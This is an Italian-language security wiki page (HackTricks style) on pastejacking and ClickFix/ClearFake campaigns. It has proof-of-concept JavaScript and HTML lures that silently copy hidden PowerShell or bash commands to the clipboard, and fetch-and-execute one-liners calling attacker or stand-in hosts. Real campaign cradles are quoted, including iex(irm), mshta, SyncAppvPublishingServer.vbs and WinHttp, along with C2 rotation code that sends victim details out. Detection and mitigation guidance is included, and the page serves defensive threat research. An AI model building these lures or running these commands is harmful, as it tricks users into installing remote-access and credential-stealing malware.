# Clipboard Hijacking (Pastejacking) Attacchi

{{#include ../../banners/hacktricks-training.md}}

> "Non incollare mai nulla che non hai copiato tu stesso." – consiglio vecchio ma ancora valido

## Panoramica

Clipboard hijacking – also known as *pastejacking* – sfrutta il fatto che gli utenti solitamente copiano e incollano comandi senza ispezionarli. Una pagina web malevola (o qualsiasi contesto capace di eseguire JavaScript, come un'app Electron o Desktop) inserisce programmaticamente testo controllato dall'attaccante negli appunti di sistema. Le vittime vengono indotte, normalmente tramite istruzioni di social-engineering accuratamente costruite, a premere **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), o ad aprire un terminale e *incollare* il contenuto degli appunti, eseguendo immediatamente comandi arbitrari.

Poiché **nessun file viene scaricato e nessun allegato viene aperto**, la tecnica bypassa la maggior parte dei controlli di sicurezza di e-mail e contenuti web che monitorano allegati, macro o esecuzione diretta di comandi. L'attacco è quindi popolare nelle campagne di phishing che veicolano famiglie di malware commodity come NetSupport RAT, Latrodectus loader o Lumma Stealer.

## Pulsanti “Copy” forzati e payload nascosti (macOS one-liners)

Alcuni macOS infostealers clonano siti di installer (es. Homebrew) e **obbligano all'uso di un pulsante “Copy”** in modo che gli utenti non possano evidenziare solo il testo visibile. La voce negli appunti contiene il comando di installer atteso più un payload Base64 aggiunto (es., `...; echo <b64> | base64 -d | sh`), così un singolo incolla esegue entrambi mentre l'interfaccia nasconde lo stadio extra.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campagne più vecchie usavano `document.execCommand('copy')`, quelle più recenti si affidano all'asincrona **Clipboard API** (`navigator.clipboard.writeText`).

## Il flusso ClickFix / ClearFake

1. L'utente visita un sito typosquatted o compromesso (es. `docusign.sa[.]com`)
2. Il JavaScript iniettato **ClearFake** chiama un helper `unsecuredCopyToClipboard()` che memorizza silenziosamente nella clipboard un PowerShell one-liner codificato in Base64.
3. Le istruzioni HTML dicono alla vittima: *“Premi **Win + R**, incolla il comando e premi Invio per risolvere il problema.”*
4. `powershell.exe` si esegue, scaricando un archivio che contiene un eseguibile legittimo più una DLL dannosa (classic DLL sideloading).
5. Il loader decripta stadi aggiuntivi, inietta shellcode e installa persistenza (es. scheduled task) – eseguendo infine NetSupport RAT / Latrodectus / Lumma Stealer.

### Esempio di catena NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legittimo Java WebStart) cerca nella sua directory `msvcp140.dll`.
* La DLL malevola risolve dinamicamente le API con **GetProcAddress**, scarica due binari (`data_3.bin`, `data_4.bin`) tramite **curl.exe**, li decripta usando una chiave XOR rolling `"https://google.com/"`, inietta il shellcode finale e decomprime **client32.exe** (NetSupport RAT) in `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Scarica `la.txt` con **curl.exe**
2. Esegue il downloader JScript tramite **cscript.exe**
3. Recupera un payload MSI → scrive `libcef.dll` accanto a un'applicazione firmata → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La chiamata **mshta** avvia uno script PowerShell nascosto che recupera `PartyContinued.exe`, estrae `Boat.pst` (CAB), ricostruisce `AutoIt3.exe` tramite `extrac32` e concatenazione di file e infine esegue uno script `.a3x` che esfiltra le credenziali del browser verso `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Alcune campagne ClickFix evitano del tutto i download di file e istruiscono le vittime a incollare un one‑liner che recupera ed esegue JavaScript via WSH, lo rende persistente e ruota il C2 quotidianamente. Esempio di catena osservata:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Caratteristiche principali
- URL offuscato invertito durante l'esecuzione per eludere ispezioni superficiali.
- JavaScript si mantiene residente tramite uno Startup LNK (WScript/CScript), e seleziona il C2 in base al giorno corrente – abilitando una rapida domain rotation.

Frammento JS minimale usato per ruotare i C2 in base alla data:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Il passo successivo comunemente distribuisce un loader che stabilisce persistenza e scarica un RAT (e.g., PureHVNC), spesso pinning TLS a un certificato hardcoded e suddividendo il traffico in chunk.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` che invoca WScript/CScript con un percorso JS sotto `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU e telemetria della command‑line contenenti `.split('').reverse().join('')` o `eval(a.responseText)`.
- Ripetuti `powershell -NoProfile -NonInteractive -Command -` con grandi payload su stdin per alimentare script lunghi senza command line estese.
- Scheduled Tasks che successivamente eseguono LOLBins come `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sotto un task/percorso che sembra un updater (e.g., `\GoogleSystem\GoogleUpdater`).

Ricerca delle minacce
- Hostnames e URL C2 che ruotano quotidianamente con pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlare eventi di scrittura nella clipboard seguiti da Win+R paste e poi immediata esecuzione di `powershell.exe`.

Blue-teams possono combinare telemetria di clipboard, creazione processi e registro per individuare abusi di pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` tiene la cronologia dei comandi **Win + R** – cercare voci Base64 / offuscate insolite.
* Security Event ID **4688** (Process Creation) dove `ParentImage` == `explorer.exe` e `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** per creazioni di file sotto `%LocalAppData%\Microsoft\Windows\WinX\` o cartelle temporanee immediatamente prima dell'evento 4688 sospetto.
* Sensori clipboard di EDR (se presenti) – correlare `Clipboard Write` seguito immediatamente da un nuovo processo PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campagne recenti producono in massa pagine di verifica fake CDN/browser ("Un momento…", IUAM-style) che costringono gli utenti a copiare comandi specifici per l'OS dalla loro clipboard nelle console native. Questo pivotta l'esecuzione fuori dal sandbox del browser e funziona sia su Windows che su macOS.

Key traits of the builder-generated pages
- Rilevamento OS tramite `navigator.userAgent` per adattare i payload (Windows PowerShell/CMD vs. macOS Terminal). Decoy/no-op opzionali per OS non supportati per mantenere l'illusione.
- Copia automatica nella clipboard su azioni UI benign (checkbox/Copy) mentre il testo visibile può differire dal contenuto reale della clipboard.
- Blocco mobile e un popover con istruzioni passo-passo: Windows → Win+R→paste→Enter; macOS → apri Terminal→paste→Enter.
- Offuscazione opzionale e injector single-file per sovrascrivere il DOM di un sito compromesso con una UI di verifica in stile Tailwind (non è richiesta la registrazione di un nuovo dominio).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence dell'esecuzione iniziale
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` in modo che l'esecuzione continui dopo la chiusura del terminale, riducendo artefatti visibili.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Rilevamento e idee di hunting specifiche per esche in stile IUAM
- Web: Pagine che associano Clipboard API ai widget di verifica; discrepanza tra testo mostrato e payload degli appunti; branching di `navigator.userAgent`; Tailwind + single-page replace in contesti sospetti.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` poco dopo un'interazione con il browser; installer batch/MSI eseguiti da `%TEMP%`.
- macOS endpoint: Terminal/iTerm che avviano `bash`/`curl`/`base64 -d` con `nohup` in prossimità di eventi del browser; job in background che sopravvivono alla chiusura del terminale.
- Correlare la cronologia `RunMRU` di Win+R e le scritture negli appunti con la successiva creazione di processi console.

Vedi anche per tecniche di supporto

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake continua a compromettere siti WordPress e a iniettare loader JavaScript che concatenano host esterni (Cloudflare Workers, GitHub/jsDelivr) e persino chiamate blockchain “etherhiding” (es., POST a endpoint API di Binance Smart Chain come `bsc-testnet.drpc[.]org`) per recuperare la logica dell'esca corrente. Le overlay recenti usano pesantemente fake CAPTCHA che istruiscono gli utenti a copiare/incollare un one-liner (T1204.004) invece di scaricare qualcosa.
- L'esecuzione iniziale è sempre più delegata a signed script hosts/LOLBAS. Le catene di gennaio 2026 hanno sostituito l'uso precedente di `mshta` con il built-in `SyncAppvPublishingServer.vbs` eseguito tramite `WScript.exe`, passando argomenti in stile PowerShell con alias/wildcard per recuperare contenuto remoto:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` è firmato e normalmente usato da App-V; abbinato a `WScript.exe` e argomenti insoliti (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) diventa una fase LOLBAS altamente indicativa per ClearFake.
- I payload falsi CAPTCHA di febbraio 2026 sono tornati a meccanismi di download puri basati su PowerShell. Due esempi reali:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- La prima catena è un grabber in-memory `iex(irm ...)`; la seconda esegue lo stage via `WinHttp.WinHttpRequest.5.1`, scrive un `.ps1` temporaneo, quindi lo avvia con `-ep bypass` in una finestra nascosta.

Suggerimenti per rilevamento e hunting per queste varianti
- Sequenza dei processi: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` oppure PowerShell cradles immediatamente dopo operazioni di clipboard/Win+R.
- Parole chiave nella riga di comando: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, o pattern raw IP `iex(irm ...)`.
- Rete: connessioni in uscita verso host di CDN worker o endpoint RPC blockchain da host che eseguono script/PowerShell poco dopo la navigazione web.
- File/registro: creazione temporanea di `.ps1` sotto `%TEMP%` oltre a voci RunMRU contenenti questi one-liner; bloccare/avvisare su signed-script LOLBAS (WScript/cscript/mshta) che eseguono con URL esterni o alias offuscati.

## Mitigazioni

1. Indurimento del browser – disabilitare l'accesso in scrittura agli appunti (`dom.events.asyncClipboard.clipboardItem` ecc.) o richiedere un gesto utente.
2. Formazione sulla sicurezza – insegnare agli utenti di *digitare* comandi sensibili o incollarli prima in un editor di testo.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control per bloccare one-liner arbitrari.
4. Controlli di rete – bloccare le richieste in uscita verso domini noti di pastejacking e C2 di malware.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Riferimenti

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
